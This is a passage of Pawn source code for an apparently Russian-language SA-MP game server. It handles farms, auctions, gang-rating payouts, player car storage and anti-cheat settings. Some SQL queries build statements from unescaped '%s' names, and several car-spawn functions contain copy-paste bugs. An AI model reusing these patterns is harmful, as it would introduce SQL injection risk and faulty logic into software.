				FarmInfo[x][fPickup][0] = CreatePickupAC(1239, 23, FarmInfo[x][fMenu][0], FarmInfo[x][fMenu][1], FarmInfo[x][fMenu][2]);
				FarmInfo[x][fPickup][1] = CreatePickupAC(1275, 23, FarmInfo[x][fCloakroom][0], FarmInfo[x][fCloakroom][1], FarmInfo[x][fCloakroom][2]);
				format(YCMDstr, 160, "Ферма ID: {FFFFFF}%i\n{DDB201}Информация: {FFFFFF}/finfo",x-1);
				FarmInfo[x][fLabel] = CreateDynamic3DTextLabel(YCMDstr, 0xDDB201FF,FarmInfo[x][fMenu][0], FarmInfo[x][fMenu][1], FarmInfo[x][fMenu][2]+1,20.0);
				CreateDynamicMapIcon(FarmInfo[x][fMenu][0], FarmInfo[x][fMenu][1], FarmInfo[x][fMenu][2],56,0);
				TOTALFARM++;
			}
			printf("[Загрузка ...] Данные из Farm получены! (%i шт.)",TOTALFARM);
			// Кары у фермы 0
			FarmInfo[1][fSeed_Car][0] = CreateVehicle(478,-367.1718,-1437.3184,25.4536,90,113,1,-1);
			FarmInfo[1][fSeed_Car][1] = CreateVehicle(478,-367.1942,-1441.3794,25.4536,90,113,1,-1);
			FarmInfo[1][fCombine] = CreateVehicle(532,-376.9983,-1450.1539,25.4536,360,-1,-1,-1);
			// Кары у фермы 1
			FarmInfo[2][fSeed_Car][0] = CreateVehicle(478,-112.7682,-30.3074,2.8443,345,113,1,-1);
			FarmInfo[2][fSeed_Car][1] = CreateVehicle(478,-108.8456,-30.3074,2.8443,345,113,1,-1);
			FarmInfo[2][fCombine] = CreateVehicle(532,-99.6833,-21.9806,2.8404,69.9411,-1,-1,-1);
			// Кары у фермы 2
			FarmInfo[3][fSeed_Car][0] = CreateVehicle(478,-1033.8198,-1173.0507,128.9458,92.2105,113,1,-1);
			FarmInfo[3][fSeed_Car][1] = CreateVehicle(478,-1033.9097,-1169.5416,128.9458,92.2105,113,1,-1);
			FarmInfo[3][fCombine] = CreateVehicle(532,-1187.8906,-1062.9275,128.9458,360,-1,-1,-1);
			// Кары у фермы 3
			FarmInfo[4][fSeed_Car][0] = CreateVehicle(478,-18.6129,45.1707,2.8443,248.6538,113,1,-1);
			FarmInfo[4][fSeed_Car][1] = CreateVehicle(478,-19.8854,42.0788,2.8429,248.6538,113,1,-1);
			FarmInfo[4][fCombine] = CreateVehicle(532,-28.4954,44.7194,2.8443,160.1106,-1,-1,-1);
			// Кары у фермы 4
			FarmInfo[5][fSeed_Car][0] = CreateVehicle(478,1949.1245,157.6664,36.6507,340.1,113,1,-1);
			FarmInfo[5][fSeed_Car][1] = CreateVehicle(478,1951.6958,156.7463,36.5491,340.1,113,1,-1);
			FarmInfo[5][fCombine] = CreateVehicle(532,1910.3037,192.0922,36.1344,256.9094,-1,-1,-1);
			for(new z = 1; z <= TOTALFARM; z++)
			{
				Farmcar_pickup[FarmInfo[z][fSeed_Car][0]] = 0;
				Farmcar_pickup[FarmInfo[z][fSeed_Car][1]] = 0;
				SetVehicleParamsEx(FarmInfo[z][fSeed_Car][0],false,false,false,false,false,false,false);
				SetVehicleParamsEx(FarmInfo[z][fSeed_Car][1],false,false,false,false,false,false,false);
				SetVehicleParamsEx(FarmInfo[z][fCombine],false,false,false,false,false,false,false);
				CarHealth[FarmInfo[z][fSeed_Car][0]] = float(1000);
				CarHealth[FarmInfo[z][fSeed_Car][1]] = float(1000);
				CarHealth[FarmInfo[z][fCombine]] = float(1000);
			}
		}
	case 29:
		{
			new day, month, year;
			gettime(day,month,year);
			if(IsPlayerConnected(GetPlayerID(FarmInfo[playerid][fAuctionName]))) SCM(GetPlayerID(FarmInfo[playerid][fAuctionName]),-1," Вы приобрели СТО/Ферму с аукциона!");
			strmid(FarmInfo[playerid][fOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(FarmInfo[playerid][fDeputy_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(FarmInfo[playerid][fDeputy_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(FarmInfo[playerid][fDeputy_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			FarmInfo[playerid][fLandTax] = 6000;
			FarmInfo[playerid][fBank] = (FarmInfo[playerid][fAuction][0]/100)*20;
			FarmInfo[playerid][fProds] = 0;
			FarmInfo[playerid][fZp] = 30;
			FarmInfo[playerid][fGrain_Price] = 5;
			FarmInfo[playerid][fGrain] = 0;
			FarmInfo[playerid][fGrain_Sown] = 0;
			FarmInfo[playerid][fProds_Selling] = 1;
			FarmInfo[playerid][fProds_Price] = 21;
			strmid(FarmInfo[playerid][fOwner],FarmInfo[playerid][fAuctionName], 0, strlen(FarmInfo[playerid][fAuctionName]), MAX_PLAYER_NAME);
			if(IsPlayerConnected(GetPlayerID(FarmInfo[playerid][fAuctionName]))) FGet(GetPlayerID(FarmInfo[playerid][fAuctionName]));
			strmid(FarmInfo[playerid][fAuctionName], "None", 0, strlen("None"), 10);
			FarmInfo[playerid][fAuction][0] = 0;
			FarmInfo[playerid][fAuction][1] = 0;
			FarmInfo[playerid][fAuction][2] = 0;
			FarmInfo[playerid][fAuction][3] = 0;
			FarmInfo[playerid][fAuction][4] = mktimes(0,0,0,day+14,month,year);
		}
	case 30:
		{
			if(!r) return printf("[Аукцион СТО/Ферм] Нет аккаунта. Деньги не были зачислены!");
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = pBank + %i WHERE Name = '%e'",FarmInfo[bizselect[playerid]][fAuction][1],FarmInfo[bizselect[playerid]][fAuctionName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			printf("Игроку %s зачислено %i вирт за аукцион СТО/Ферм",FarmInfo[bizselect[playerid]][fAuctionName], FarmInfo[bizselect[playerid]][fAuction][1]);
		}
	case 31:
		{
			if(!r) return printf("[Загрузка ...] Данные из Stall не получены!");
			for(x = 1; x <= r; x++)
			{
				StallInfo[x][stID] = 				cache_get_row_int(x-1,0, DATABASE);
				StallInfo[x][stPos][0] = 			cache_get_row_float(x-1,1, DATABASE);
				StallInfo[x][stPos][1] = 			cache_get_row_float(x-1,2, DATABASE);
				StallInfo[x][stPos][2] = 			cache_get_row_float(x-1,3, DATABASE);
				StallInfo[x][stPos][3] = 			cache_get_row_float(x-1,4, DATABASE);
				TOTALSTALL++;

				CreateDynamicObject(1340, StallInfo[x][stPos][0], StallInfo[x][stPos][1], StallInfo[x][stPos][2], 0, 0, StallInfo[x][stPos][3]);
				StallInfo[x][stText] = CreateDynamic3DTextLabel( "Не работает", 0xFF8C37FF, StallInfo[x][stPos][0], StallInfo[x][stPos][1], StallInfo[x][stPos][2], 8.0 );
			}
			printf("[Загрузка ...] Данные из Stall получены! (%i шт.)",TOTALSTALL);
		}
	case 32:
		{
			if(!r) return printf("[Загрузка ...] Данные из Gangzone не получены!");
			for(x = 1; x <= r; x++)
			{
				GZInfo[x][gID] = 					cache_get_row_int(x-1,0, DATABASE);
				GZInfo[x][gCoords][0] = 			cache_get_row_float(x-1,1, DATABASE);
				GZInfo[x][gCoords][1] = 			cache_get_row_float(x-1,2, DATABASE);
				GZInfo[x][gCoords][2] = 			cache_get_row_float(x-1,3, DATABASE);
				GZInfo[x][gCoords][3] = 			cache_get_row_float(x-1,4, DATABASE);
				GZInfo[x][gFrakVlad] = 				cache_get_row_int(x-1,5, DATABASE);
				TOTALGZ++;

				GZInfo[x][gZone] = GangZoneCreate(GZInfo[x][gCoords][0],GZInfo[x][gCoords][1],GZInfo[x][gCoords][2],GZInfo[x][gCoords][3]);
			}
			printf("[Загрузка ...] Данные из Gangzone получены! (%i шт.)",TOTALGZ);
		}
	case 34:
		{
			new null[2] = 0;
			if(r)
			{
				for(x = 1; x <= r; x++)
				{
					new unban = cache_get_row_int(x-1,1, DATABASE);
					if(unban < Now())
					{
						mysql_format(DATABASE,QUERY,128, "DELETE FROM `boost` WHERE `Text` = 'BoostTime'");
						mysql_function_query(DATABASE,QUERY,false,"","");
						null[0]++;
						booston = 0;
					}
					else null[1]++,booston = 1;
				}
			}
			printf("[Загрузка ...] Бонусы включены %i. Бонусы выключены %i",null[1],null[0]);
		}
	case 35:
		{
			if(r)
			{
				new ban = cache_get_field_content_int(0,"boosttime");
				new year, month, day,hour,minute,second;
				TimestampToDates(ban, year, month, day, hour, minute, second, 0);
				booston = 1;
			}
		}
	case 36:
		{
			if(r)
			{
				new dialog[510];
				strcat(dialog,"Бонус\t\tМножитель\n");
				strcat(dialog,"Опыт\t\t3.0000\n");
				strcat(dialog,"Донат\t\t2.0000\n");
				strcat(dialog,"Патронов в Аммо\t\t3.0000\n");
				strcat(dialog,"Патронов у Мафий\t\t3.0000\n");
				strcat(dialog,"Патронов у Банд\t\t3.0000\n");
				strcat(dialog,"Патронов у Байкеров\t\t3.0000\n");
				strcat(dialog,"Опыт Такси\t\t3.0000\n");
				strcat(dialog,"Опыт Продуктовозов\t\t2.0000\n");
				strcat(dialog,"Опыт Дальнобойщиков\t\t3.0000\n");
				strcat(dialog,"Опыт Автоугонщиков\t\t3.0000\n");
				strcat(dialog,"Скилл Ударов\t\t3.0000\n");
				strcat(dialog,"Скилл Оружия\t\t3.0000\n");
				strcat(dialog,"Скидка в Автосалоне\t\t0.8000\n");
				strcat(dialog,"Скидка на Скины\t\t0.8000\n");
				strcat(dialog,"Скидка на Квартиры\t\t0.6000\n");
				strcat(dialog,"Процент в Костях\t\t0.5000\n");
				strcat(dialog,"Приз в Гонках\t\t3.0000\n");
				strcat(dialog,"Приз в Пейнтболе\t\t3.0000\n");
				strcat(dialog,"Таймер на Ферме\t\t0.3300\n");
				strcat(dialog,"Таймер на Нарко\t\t0.3300\n");
				strcat(dialog,"Промокод\t\t2.0000\n");
				new btime = cache_get_field_content_int(0,"boosttime");
				new year, month, day, hour, minute, second;
				TimestampToDates(btime, year, month, day, hour, minute, second, 0);
				format(YCMDstr, sizeof(YCMDstr), "Действует до: %02i/%02i/%02i  %02i:%02i",day,month,year,hour,minute);
				ShowPlayerDialog(playerid, 9922, DIALOG_STYLE_TABLIST_HEADERS, YCMDstr,dialog,"Закрыть", "");
			}
		}
	case 33:
		{
			if(!r)
			{
			    for(new i=0;i<5;i++)
				{
					mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`,`model`,`fuel`,`color_one`,`color_two`) VALUES ('%s','%i','462','100','1','1')" ,PlayerInfo[playerid][pName],i);
					mysql_function_query(DATABASE,QUERY,false,"","");
				}
				/*mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`) VALUES ('%s','0')" ,PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`) VALUES ('%s','1')" ,PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`) VALUES ('%s','2')" ,PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`) VALUES ('%s','3')" ,PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_CARS"` (`owner`,`id`) VALUES ('%s','4')" ,PlayerInfo[playerid][pName]);
				mysql_function_query(DATABASE,QUERY,false,"","");*/
				return SCM(playerid,COLOR_GREY," Информация о ваших автомобилях не была найдена. Перезайдите на сервер!");
			}
			for(x = 0; x < r; x++)
			{
				CarInfo[playerid][carID][x] =          	cache_get_row_int(x,0, DATABASE);
				cache_get_row(x, 1, 			string, DATABASE, MAX_PLAYER_NAME);
				CarInfo[playerid][carModel][x] =       	cache_get_row_int(x,2, DATABASE);
				CarInfo[playerid][carColor_one][x] =   	cache_get_row_int(x,3, DATABASE);
				CarInfo[playerid][carColor_two][x] =   	cache_get_row_int(x,4, DATABASE);
				CarInfo[playerid][carPercent][x] =   	cache_get_row_int(x,5, DATABASE);
				CarInfo[playerid][carFuel][x] =   		cache_get_row_float(x,6, DATABASE);
				CarInfo[playerid][carVehcom_1][x] =   		cache_get_row_int(x,7, DATABASE);
				CarInfo[playerid][carVehcom_2][x] =   		cache_get_row_int(x,8, DATABASE);
				CarInfo[playerid][carVehcom_3][x] =   		cache_get_row_int(x,9, DATABASE);
				CarInfo[playerid][carVehcom_4][x] =   		cache_get_row_int(x,10, DATABASE);
				CarInfo[playerid][carVehcom_5][x] =   		cache_get_row_int(x,11, DATABASE);
				CarInfo[playerid][carVehcom_6][x] =   		cache_get_row_int(x,12, DATABASE);
				CarInfo[playerid][carVehcom_7][x] =   		cache_get_row_int(x,13, DATABASE);
				CarInfo[playerid][carVehcom_8][x] =   		cache_get_row_int(x,14, DATABASE);
				CarInfo[playerid][carVehcom_9][x] =   		cache_get_row_int(x,15, DATABASE);
				CarInfo[playerid][carVehcom_10][x] =   		cache_get_row_int(x,16, DATABASE);
				CarInfo[playerid][carVehcom_11][x] =   		cache_get_row_int(x,17, DATABASE);
				CarInfo[playerid][carVehcom_12][x] =   		cache_get_row_int(x,18, DATABASE);
				CarInfo[playerid][carVehcom_13][x] =   		cache_get_row_int(x,19, DATABASE);
				CarInfo[playerid][carVehcom_14][x] =   		cache_get_row_int(x,20, DATABASE);
			}
			printf("[Загрузка ...] Автомобили игрока %s были загружены: %i, %i, %i, %i, %i",Name(playerid), CarInfo[playerid][carModel][0],CarInfo[playerid][carModel][1],CarInfo[playerid][carModel][2],CarInfo[playerid][carModel][3],CarInfo[playerid][carModel][4]);
			LoadCarsPlayer(playerid);
		}
		case 37:
		{
			if(!r)
			{
				return printf("[Error] Информация о машинах игрока в бд не найдена");
			}
			new temp[0x9e];
			for(x = 0; x < r; x++)
			{
				mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_CARS"` SET ");
				format(temp,sizeof(temp),"`model`= '%i',",CarInfo[playerid][carModel][x]), 					strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`color_one`= '%i',",CarInfo[playerid][carColor_one][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`color_two`= '%i',",CarInfo[playerid][carColor_two][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`percent`= '%i',",CarInfo[playerid][carPercent][x]), 				strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`fuel`= '%f',",CarInfo[playerid][carFuel][x]), 					strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_1`= '%i',",CarInfo[playerid][carVehcom_1][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_2`= '%i',",CarInfo[playerid][carVehcom_2][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_3`= '%i',",CarInfo[playerid][carVehcom_3][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_4`= '%i',",CarInfo[playerid][carVehcom_4][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_5`= '%i',",CarInfo[playerid][carVehcom_5][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_6`= '%i',",CarInfo[playerid][carVehcom_6][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_7`= '%i',",CarInfo[playerid][carVehcom_7][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_8`= '%i',",CarInfo[playerid][carVehcom_8][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_9`= '%i',",CarInfo[playerid][carVehcom_9][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_10`= '%i',",CarInfo[playerid][carVehcom_10][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_11`= '%i',",CarInfo[playerid][carVehcom_11][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_12`= '%i',",CarInfo[playerid][carVehcom_12][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_13`= '%i',",CarInfo[playerid][carVehcom_13][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp),"`vehcom_14`= '%i'",CarInfo[playerid][carVehcom_14][x]), 			strcat(QUERY,temp,sizeof(QUERY));
				format(temp,sizeof(temp)," WHERE id = '%i' AND owner = '%s'",x,PlayerInfo[playerid][pName]),		strcat(QUERY,temp,sizeof(QUERY));
				mysql_function_query(DATABASE, QUERY, true, "", "");
			}
			printf("[Сохранение] Автомобили %s | %i,%i,%i,%i,%i сохранены",PlayerInfo[playerid][pName],CarInfo[playerid][carModel][0],CarInfo[playerid][carModel][1],CarInfo[playerid][carModel][2],CarInfo[playerid][carModel][3],CarInfo[playerid][carModel][4]);
		}
		case 55:
		{
		    if(!r) return true;
		    gRating[Rifa] = cache_get_field_content_int(0, "mark");
		    gRating[Grove] = cache_get_field_content_int(1, "mark");
		    gRating[Ballas] = cache_get_field_content_int(2, "mark");
		    gRating[Vagos] = cache_get_field_content_int(3, "mark");
		    gRating[Aztec] = cache_get_field_content_int(4, "mark");
	    	printf("[Загрузка ...] Данные про рейтинг банд получены: %i %i %i %i %i", gRating[Rifa], gRating[Grove], gRating[Ballas], gRating[Vagos], gRating[Aztec]);
			//
			new day, month, year;
			getdate(year, month, day);
			if(day == 1)
			{
			    mysql_format(DATABASE, QUERY, 62, "SELECT `Name`,`grating` FROM `"TABLE_ACCOUNTS"` WHERE `grating` > '0'");
				mysql_query(DATABASE, QUERY);
				new rs = cache_num_rows();
				new labelName[32], label;
				if(rs)
				{
				    cache_get_field_content(0,"Name",labelName,DATABASE,60);
					label = cache_get_field_content_int(0, "grating");
					new labels;
					for(new i = 0; i < rs; i++)
					{
						labels = cache_get_field_content_int(i, "grating");
					    if(label < labels)
					    {
					        label = labels;
					        cache_get_field_content(i,"Name",labelName,DATABASE,60);
					    }
					}
				}
				else
				{
				    labelName = "Нет"; //strmid(labelName, "Нет", 0, strlen("Нет"), sizeof(labelName));
				    label = 0;
				}
			    mysql_format(DATABASE,QUERY, 300, "INSERT INTO `gratinghistory` (`date`, `player`, `playerMark`, `Grove street`, `Ballas`, `Rifa`, `Aztec`, `Vagos`) VALUES ('%02i/%02i/%02i', '%s', '%i', '%i', '%i', '%i', '%i', '%i')",
							year, month, day, labelName, label, gRating[Grove], gRating[Ballas], gRating[Rifa], gRating[Aztec], gRating[Vagos]);
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET `grating` = '0'");
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, 128, "UPDATE `grating` SET `mark` = '0'");
				mysql_function_query(DATABASE,QUERY,false,"","");
				mysql_format(DATABASE, QUERY, 62, "SELECT pCash FROM `"TABLE_ACCOUNTS"` WHERE Name = '%s'",labelName);
				mysql_query(DATABASE, QUERY);
				new cashes = cache_get_field_content_int(0,"pCash");
				mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET `pCash` = '%i', `pText` = '8' WHERE Name = '%s'", cashes+2500000, labelName);
				mysql_function_query(DATABASE,QUERY,false,"","");
				new jq1, jq2, jq3, jqr;
			    jqr = 0;
			    if(jqr < gRating[Grove])
			    {
			        jq1 = 15;
			        jqr = gRating[Grove];
			    }
			    if(jqr < gRating[Ballas])
			    {
			        jq1 = 12;
			        jqr = gRating[Ballas];
			    }
			    if(jqr < gRating[Vagos])
			    {
			        jq1 = 13;
			        jqr = gRating[Vagos];
			    }
			    if(jqr < gRating[Aztec])
			    {
			        jq1 = 17;
			        jqr = gRating[Aztec];
			    }
			    if(jqr < gRating[Rifa])
			    {
			        jq1 = 18;
			        jqr = gRating[Rifa];
			    }
			    if(jq1 != 0)
			    {
					mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_OTHERS"` SET `best_gang` = '%i'", jq1);
					mysql_function_query(DATABASE,QUERY,false,"","");
				}
				BestGang = jq1;
				new fqs[32];
				switch(BestGang)
				{
					case 15: FracBank[0][fGrove]  += 5000000, fqs = "Grove";
					case 12: FracBank[0][fBallas] += 5000000, fqs = "Ballas";
					case 13: FracBank[0][fVagos]  += 5000000, fqs = "Vagos";
					case 17: FracBank[0][fAztek]  += 5000000, fqs = "Aztec";
					case 18: FracBank[0][fRifa]   += 5000000, fqs = "Rifa";
				}
				if(jq1 > 0) printf("Банде %s зачислено 5 000 000 за первое место", fqs);
				else printf("Лучшая банда не определена");
				jqr = 0;
			    if(jqr < gRating[Grove] && jq1 != 15)
			    {
			        jq2 = 15;
			        jqr = gRating[Grove];
			    }
			    if(jqr < gRating[Ballas] && jq1 != 12)
			    {
			        jq2 = 12;
			        jqr = gRating[Ballas];
			    }
			    if(jqr < gRating[Vagos] && jq1 != 13)
			    {
			        jq2 = 13;
			        jqr = gRating[Vagos];
			    }
			    if(jqr < gRating[Aztec] && jq1 != 17)
			    {
			        jq2 = 17;
			        jqr = gRating[Aztec];
			    }
			    if(jqr < gRating[Rifa] && jq1 != 18)
			    {
			        jq2 = 18;
			        jqr = gRating[Rifa];
			    }
			    switch(jq2)
				{
					case 15: FracBank[0][fGrove]  += 2000000, fqs = "Grove";
					case 12: FracBank[0][fBallas] += 2000000, fqs = "Ballas";
					case 13: FracBank[0][fVagos]  += 2000000, fqs = "Vagos";
					case 17: FracBank[0][fAztek]  += 2000000, fqs = "Aztec";
					case 18: FracBank[0][fRifa]   += 2000000, fqs = "Rifa";
				}
				if(jq2 > 0) printf("Банде %s зачислено 2 000 000 за второе место", fqs);
				else printf("Вторая банда не определена");
				jqr = 0;
			    if(jqr < gRating[Grove] && jq1 != 15 && jq2 != 15)
			    {
			        jq3 = 15;
			        jqr = gRating[Grove];
			    }
			    if(jqr < gRating[Ballas] && jq1 != 12 && jq2 != 12)
			    {
			        jq3 = 12;
			        jqr = gRating[Ballas];
			    }
			    if(jqr < gRating[Vagos] && jq1 != 13 && jq2 != 13)
			    {
			        jq3 = 13;
			        jqr = gRating[Vagos];
			    }
			    if(jqr < gRating[Aztec] && jq1 != 17 && jq2 != 17)
			    {
			        jq3 = 17;
			        jqr = gRating[Aztec];
			    }
			    if(jqr < gRating[Rifa] && jq1 != 18 && jq2 != 18)
			    {
			        jq3 = 18;
			        jqr = gRating[Rifa];
			    }
			    switch(jq3)
				{
					case 15: FracBank[0][fGrove]  += 1000000, fqs = "Grove";
					case 12: FracBank[0][fBallas] += 1000000, fqs = "Ballas";
					case 13: FracBank[0][fVagos]  += 1000000, fqs = "Vagos";
					case 17: FracBank[0][fAztek]  += 1000000, fqs = "Aztec";
					case 18: FracBank[0][fRifa]   += 1000000, fqs = "Rifa";
				}
				if(jq3 > 0) printf("Банде %s зачислено 1 000 000 за третье место", fqs);
				else printf("Третья банда не определена");
				gRating[Grove] = 0, gRating[Ballas] = 0, gRating[Vagos] = 0, gRating[Aztec] = 0, gRating[Rifa] = 0;
			}
		}
	}
	return true;
}
stock SpawnCarOne(playerid, Float:x, Float:y, Float:z, Float:range)
{
	garage_car[playerid][0] = CreateVehicle(CarInfo[playerid][carModel][0], x, y, z, range , CarInfo[playerid][carColor_one][0] ,CarInfo[playerid][carColor_two][0], 86400);
	SetVehicleParamsEx(garage_car[playerid][0],false,false,false,true,false,false,false);
	CarHealth[garage_car[playerid][0]] = float(1000);
	createdcar ++;
	Fuell[garage_car[playerid][0]] = CarInfo[playerid][carFuel][0];
	LoadTuning(playerid,garage_car[playerid][0],0);
	SetPVarInt(playerid,"CarsInGarage",1);
	CarInfo[playerid][carID][0] = garage_car[playerid][0];
}
stock SpawnCarTwo(playerid, Float:x, Float:y, Float:z, Float:range)
{
	garage_car[playerid][1] = CreateVehicle(CarInfo[playerid][carModel][1], x, y, z, range , CarInfo[playerid][carColor_one][1] ,CarInfo[playerid][carColor_two][1], 86400);
	SetVehicleParamsEx(garage_car[playerid][1],false,false,false,true,false,false,false);
	CarHealth[garage_car[playerid][1]] = float(1000);
	createdcar ++;
	Fuell[garage_car[playerid][1]] = CarInfo[playerid][carFuel][0];
	LoadTuning(playerid,garage_car[playerid][1],1);
	SetPVarInt(playerid,"CarsInGarage",1);
	CarInfo[playerid][carID][1] = garage_car[playerid][1];
}
stock SpawnCarThree(playerid, Float:x, Float:y, Float:z, Float:range)
{
	garage_car[playerid][2] = CreateVehicle(CarInfo[playerid][carModel][2], x, y, z, range , CarInfo[playerid][carColor_one][2] ,CarInfo[playerid][carColor_two][2], 86400);
	SetVehicleParamsEx(garage_car[playerid][0],false,false,false,true,false,false,false);
	CarHealth[garage_car[playerid][2]] = float(1000);
	createdcar ++;
	Fuell[garage_car[playerid][2]] = CarInfo[playerid][carFuel][2];
	LoadTuning(playerid,garage_car[playerid][2],2);
	SetPVarInt(playerid,"CarsInGarage",1);
	CarInfo[playerid][carID][2] = garage_car[playerid][2];
}
stock SpawnCarFour(playerid, Float:x, Float:y, Float:z, Float:range)
{
	garage_car[playerid][3] = CreateVehicle(CarInfo[playerid][carModel][3], x, y, z, range , CarInfo[playerid][carColor_one][3] ,CarInfo[playerid][carColor_two][3], 86400);
	SetVehicleParamsEx(garage_car[playerid][3],false,false,false,true,false,false,false);
	CarHealth[garage_car[playerid][3]] = float(1000);
	createdcar ++;
	Fuell[garage_car[playerid][3]] = CarInfo[playerid][carFuel][3];
	LoadTuning(playerid,garage_car[playerid][3],3);
	SetPVarInt(playerid,"CarsInGarage",1);
	CarInfo[playerid][carID][3] = garage_car[playerid][3];
}
stock SpawnCarFive(playerid, Float:x, Float:y, Float:z, Float:range)
{
	garage_car[playerid][4] = CreateVehicle(CarInfo[playerid][carModel][4], x, y, z, range , CarInfo[playerid][carColor_one][4] ,CarInfo[playerid][carColor_two][4], 86400);
	SetVehicleParamsEx(garage_car[playerid][4],false,false,false,true,false,false,false);
	CarHealth[garage_car[playerid][4]] = float(1000);
	createdcar ++;
	Fuell[garage_car[playerid][4]] = CarInfo[playerid][carFuel][4];
	LoadTuning(playerid,garage_car[playerid][4],4);
	SetPVarInt(playerid,"CarsInGarage",1);
	CarInfo[playerid][carID][4] = garage_car[playerid][4];
}
forward LoadSettings();
public LoadSettings()
{
	new CheatSettings[500];
	cache_get_field_content(0, "CheatSetting", CheatSettings, 106);
	sscanf(CheatSettings, "p<,>a<i>[53]",SettingInfo[CheatSetting]);
	printf("[Evolve AntiCheat]: Настройки Анти чита успешно загружены!");
	return true;
}
forward OnCheatDetected(playerid,type, code);
public OnCheatDetected(playerid,type, code)
{
    switch(code)
    {
        case 0: InfoCheats(playerid, code);
        case 1: InfoCheats(playerid, code);
       	case 2: InfoCheats(playerid, code);
        case 3: InfoCheats(playerid, code);
        case 4: InfoCheats(playerid, code);
        case 5: InfoCheats(playerid, code);
        case 6: InfoCheats(playerid, code);
        case 7: InfoCheats(playerid, code);
        case 8: InfoCheats(playerid, code);
        case 9: InfoCheats(playerid, code);
        case 10: InfoCheats(playerid, code);
        case 11: InfoCheats(playerid, code);
        case 12: InfoCheats(playerid, code);
        case 13: InfoCheats(playerid, code);
        case 14: InfoCheats(playerid, code);
        case 15: InfoCheats(playerid, code);
        case 16: InfoCheats(playerid, code);
        case 17: InfoCheats(playerid, code);
        case 18: InfoCheats(playerid, code);
        case 19: InfoCheats(playerid, code);
        case 20: InfoCheats(playerid, code);
        case 21: InfoCheats(playerid, code);
        case 22: InfoCheats(playerid, code);
        case 23: InfoCheats(playerid, code);
        case 24: InfoCheats(playerid, code);
        case 25: InfoCheats(playerid, code);
        case 26: InfoCheats(playerid, code);
        case 27: InfoCheats(playerid, code);
        case 28: InfoCheats(playerid, code);
        case 29: InfoCheats(playerid, code);
        case 30: InfoCheats(playerid, code);
        case 31: InfoCheats(playerid, code);
        case 32: InfoCheats(playerid, code);
        case 33: InfoCheats(playerid, code);
        case 34: InfoCheats(playerid, code);
        case 35: InfoCheats(playerid, code);
        case 36: InfoCheats(playerid, code);
        case 37: InfoCheats(playerid, code);
        case 38: InfoCheats(playerid, code);
        case 39: InfoCheats(playerid, code);
        case 40: InfoCheats(playerid, code);
        case 41: InfoCheats(playerid, code);
        case 42: InfoCheats(playerid, code);
        case 43: InfoCheats(playerid, code);
        case 44: InfoCheats(playerid, code);
        case 45: InfoCheats(playerid, code);
        case 46: InfoCheats(playerid, code);
        case 47: InfoCheats(playerid, code);
        case 48: InfoCheats(playerid, code);
        case 49: InfoCheats(playerid, code);
        case 50: InfoCheats(playerid, code);
        case 51: InfoCheats(playerid, code);
        case 52: InfoCheats(playerid, code);
    }
    return true;
}
new reason_ac[][] = {"{ae433d}Выключено", "{FFF1AF}Оповещение", "{33CC99}Включено"};
stock ShowCheatSettingsApanel2(playerid)
{
	format(string,1700, "{FFFFFF}Наименование\t\tКод\t\t{FFFFFF}Параметр\n\
	{FFFFFF}Ускоренная стрельба\t\t{F81414}126\t\t%s\n\
	{FFFFFF}Ложный Спавн\t\t{F81414}127\t%s\n\
	{FFFFFF}Ложная смерть\t\t{F81414}128\t%s\n\
